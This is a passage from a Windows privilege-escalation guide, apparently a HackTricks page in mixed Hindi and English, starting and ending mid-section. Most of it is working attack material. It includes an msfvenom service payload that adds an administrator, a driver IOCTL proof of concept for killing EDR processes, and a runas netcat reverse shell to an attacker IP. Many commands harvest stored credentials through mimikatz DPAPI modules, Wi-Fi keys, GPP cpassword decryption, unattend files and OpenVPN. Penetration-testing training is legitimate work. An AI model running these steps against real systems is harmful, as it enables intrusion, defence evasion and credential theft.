wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability का पता लगा सकते हैं और इसे exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप manually metasploit के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई सेवा विफल हो तो क्या कार्रवाई की जाए। इस फीचर को किसी binary की ओर point करने के लिए कॉन्फ़िगर किया जा सकता है। यदि इस binary को बदलना संभव हो तो privilege escalation संभव हो सकता है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँचें **permissions of the binaries** (शायद आप किसी एक को overwrite कर के escalate privileges कर सकें) और **फ़ोल्डरों** की भी जाँच करें ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमति

जाँचें कि क्या आप किसी config file को modify करके कोई special file पढ़ सकते हैं, या क्या आप किसी binary को modify कर सकते हैं जो Administrator account (schedtasks) द्वारा executed होगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` सबफ़ोल्डरों के अंतर्गत किसी भी plugin DLL को autoload करता है। यदि writable portable/copy install मौजूद है, तो एक malicious plugin डालने से हर लॉन्च पर `notepad++.exe` के अंदर automatic code execution हो जाती है (इसमें `DllMain` और plugin callbacks से होने वाली execution भी शामिल है)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**जाँचें कि क्या आप किसी registry या किसी binary को overwrite कर सकते हैं जो किसी दूसरे user द्वारा execute किया जाएगा।**\
**Read** the **following page** से अधिक जानें कि रोचक **autoruns locations to escalate privileges** क्या हैं:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), आप kernel memory से सीधे एक SYSTEM token चोरी करके escalate कर सकते हैं। चरण-दर-चरण technique देखने के लिए:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities आपको deterministic layouts तैयार करने, writable HKLM/HKU descendants का दुरुपयोग करने, और metadata corruption को kernel paged-pool overflows में बदलने की अनुमति देती हैं बिना किसी custom driver के। पूरा chain यहाँ पढ़ें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपने device object को एक मजबूत SDDL के साथ IoCreateDeviceSecure के माध्यम से बनाते हैं, लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL तब लागू नहीं होता जब device को ऐसे path से खोला जाता है जिसमें एक अतिरिक्त component हो, जिससे कोई भी unprivileged user निम्नलिखित जैसे namespace path का उपयोग करके एक handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार जब user device खोल सकता है, privileged IOCTLs जो driver द्वारा expose किए गए हैं उन्हें LPE और tampering के लिए दुरुपयोग किया जा सकता है। वास्तविक दुनिया में पाए गए उदाहरणी क्षमताएं:
- किसी भी arbitrary process को full-access handle लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser)।
- बिना प्रतिबंध raw disk read/write (offline tampering, boot-time persistence tricks)।
- किसी भी process को terminate करना, Protected Process/Light (PP/PPL) सहित, जिससे user land से kernel के माध्यम से AV/EDR kill संभव हो जाता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- जब आप ऐसे device objects बनाते हैं जिन्हें DACL से restricted किया जाना है, तब हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context सत्यापित करें। process termination या handle returns अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device नामों (e.g., \\ .\\amsdk*) के user-mode opens और दुरुपयोग सूचक विशिष्ट IOCTL अनुक्रमों की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग कैसे करें, इसके बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जांच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहरी से **प्रतिबंधित सेवाओं** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### राउटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करना, नियम बनाना, बंद करना, बंद करना...)**

अधिक[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आप root user बन जाते हैं तो आप किसी भी पोर्ट पर listen कर सकते हैं (पहली बार जब आप `nc.exe` का उपयोग किसी पोर्ट पर listen करने के लिए करते हैं, तो यह GUI के माध्यम से पूछेगा कि क्या `nc` को firewall द्वारा अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
आसानी से bash को root के रूप में शुरू करने के लिए, आप आज़मा सकते हैं `--default-user root`

आप `WSL` filesystem को फोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं।

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### क्रेडेंशियल मैनेजर / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault उन सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल्स स्टोर करता है जिनके लिए **Windows** उपयोगकर्ता को स्वतः लॉग इन कर सकता है। शुरुआत में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook, Twitter, Gmail आदि क्रेडेंशियल्स स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हो जाएं। पर ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनसे **Windows** उपयोगकर्ता स्वतः लॉग इन हो सके, जिसका मतलब यह है कि कोई भी **Windows application that needs credentials to access a resource** (server या वेबसाइट) **can make use of this Credential Manager** और Windows Vault का उपयोग कर उपलब्ध क्रेडेंशियल्स का उपयोग कर सकता है, बजाय इसके कि उपयोगकर्ता बार-बार username और password दर्ज करें।

यदि ऐप्लिकेशन Credential Manager के साथ इंटरैक्ट नहीं करतीं, तो मुझे नहीं लगता कि वे किसी दिए गए resource के लिए क्रेडेंशियल्स का उपयोग कर पाएँगी। इसलिए, यदि आपकी एप्लिकेशन vault का उपयोग करना चाहती है, तो उसे किसी न किसी तरह **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

मशीन पर स्टोर किए गए क्रेडेंशियल्स को सूचीबद्ध करने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं ताकि सेव किए गए credentials का उपयोग किया जा सके। निम्न उदाहरण SMB share के माध्यम से एक remote binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` का उपयोग दिए गए credential के साथ।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

The **Data Protection API (DPAPI)** विंडोज़ ऑपरेटिंग सिस्टम के भीतर मुख्य रूप से asymmetric private keys के symmetric encryption के लिए डेटा के symmetric encryption की एक विधि प्रदान करती है। यह encryption entropy में महत्त्वपूर्ण योगदान देने के लिए उपयोगकर्ता या सिस्टम secret का उपयोग करती है।

DPAPI उपयोगकर्ता के login secrets से व्युत्पन्न एक symmetric key के माध्यम से keys के encryption को सक्षम करती है। system encryption वाले परिदृश्यों में, यह सिस्टम के domain authentication secrets का उपयोग करती है।

DPAPI का उपयोग करके encrypted user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहीत होते हैं, जहाँ `{SID}` उपयोगकर्ता का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **DPAPI key, जो उसी फ़ाइल में उपयोगकर्ता की private keys की रक्षा करने वाले master key के साथ सह-स्थित होती है**, आमतौर पर 64 bytes की random data होती है। (यह ध्यान रखने योग्य है कि इस डायरेक्टरी तक पहुँच सीमित है, इसलिए इसकी सामग्री को CMD में `dir` कमांड से सूचीबद्ध नहीं किया जा सकता, हालाँकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डिक्रिप्ट करने के लिए उपयुक्त arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**master password द्वारा संरक्षित credentials फ़ाइलें** आमतौर पर निम्नलिखित स्थानों पर स्थित होती हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप **mimikatz module** `dpapi::cred` को उपयुक्त `/masterkey` के साथ decrypt करने के लिए उपयोग कर सकते हैं.\
आप `sekurlsa::dpapi` module के साथ **extract many DPAPI** **masterkeys** को **memory** से निकाल सकते हैं (यदि आप root हैं)。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell क्रेडेंशियल्स

**PowerShell क्रेडेंशियल्स** अक्सर **scripting** और automation टास्क के लिए सुविधाजनक तरीके से encrypted क्रेडेंशियल्स स्टोर करने हेतु उपयोग किए जाते हैं। ये क्रेडेंशियल्स **DPAPI** के द्वारा संरक्षित होते हैं, जिसका सामान्यतः मतलब यह होता है कि इन्हें केवल उसी user द्वारा उसी कंप्यूटर पर decrypt किया जा सकता है जिस पर इन्हें बनाया गया था।

जिस फ़ाइल में PS क्रेडेंशियल्स मौजूद हैं, उन्हें **decrypt** करने के लिए आप कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं।

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the उपयुक्त `/masterkey` के साथ **Mimikatz** `dpapi::rdg` module का उपयोग करके **decrypt any .rdg files**\ आप मेमोरी से **extract many DPAPI masterkeys** Mimikatz `sekurlsa::dpapi` module के साथ निकाल सकते हैं

### Sticky Notes

लोग अक्सर Windows वर्कस्टेशनों पर StickyNotes ऐप का उपयोग **save passwords** और अन्य जानकारी संग्रहीत करने के लिए करते हैं, यह समझे बिना कि यह एक डेटाबेस फ़ाइल है। यह फ़ाइल इस पथ पर स्थित है `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` और हमेशा खोजने और जांचने के लायक होती है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से पासवर्ड recover करने के लिए आपको Administrator होना चाहिए और High Integrity level के तहत चलाना होगा।**\
**AppCmd.exe** इस `%systemroot%\system32\inetsrv\` डायरेक्टरी में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और इन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं .\
इंस्टॉलर **SYSTEM privileges के साथ चलाए जाते हैं**, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**) के प्रति असुरक्षित हैं।
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कीज़
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys रजिस्ट्री में

SSH private keys को रजिस्ट्री कुंजी `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत किया जा सकता है, इसलिए आपको देखना चाहिए कि वहाँ कुछ दिलचस्प तो नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस पाथ के अंदर कोई एंट्री मिलती है तो वह सम्भवतः एक सहेजा हुआ SSH key होगा। यह एन्क्रिप्टेड रूप में स्टोर किया गया है लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके डिक्रिप्ट किया जा सकता है।\
More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर अपने आप शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब वैध नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh द्वारा किसी मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### अनदेखी फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को खोजने के लिए **metasploit** का भी उपयोग कर सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल जिसका नाम **SiteList.xml** है उसकी खोज करें

### कैश्ड GPP पासवर्ड

एक ऐसी सुविधा पहले उपलब्ध थी जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर कस्टम लोकल एडमिनिस्ट्रेटर अकाउंट डिप्लॉय करने की अनुमति देती थी। हालाँकि, इस तरीके में महत्वपूर्ण सुरक्षा दोष थे। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs में मौजूद पासवर्ड, जो AES256 से एन्क्रिप्ट किए गए थे और एक सार्वजनिक रूप से दस्तावेज़ित default key का उपयोग करते थे, किसी भी authenticated user द्वारा डीक्रिप्ट किए जा सकते थे। यह एक गंभीर जोखिम था क्योंकि इससे उपयोगकर्ताओं को elevated privileges मिलने की संभावना बन जाती थी।

इस जोखिम को कम करने के लिए एक फ़ंक्शन विकसित किया गया था जो लोकली cached GPP फ़ाइलों के लिए स्कैन करता है जिनमें खाली नहीं रहने वाला "cpassword" फ़ील्ड होता है। ऐसी फ़ाइल मिलने पर, फ़ंक्शन पासवर्ड को डीक्रिप्ट करता है और एक कस्टम PowerShell ऑब्जेक्ट लौटाता है। यह ऑब्जेक्ट GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जिससे इस सुरक्षा भेद्यता की पहचान और सुधार में मदद मिलती है।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डीक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके credentials दर्ज करने के लिए कह सकते हैं या यहां तक कि किसी दूसरे उपयोगकर्ता के credentials भी** माँग सकते हैं यदि आपको लगता है कि वह उन्हें जान सकता है (ध्यान दें कि क्लाइंट से सीधे **पूछना** अर्थात सीधे **credentials** माँगना वास्तव में **जोखिम भरा** है):
```bash
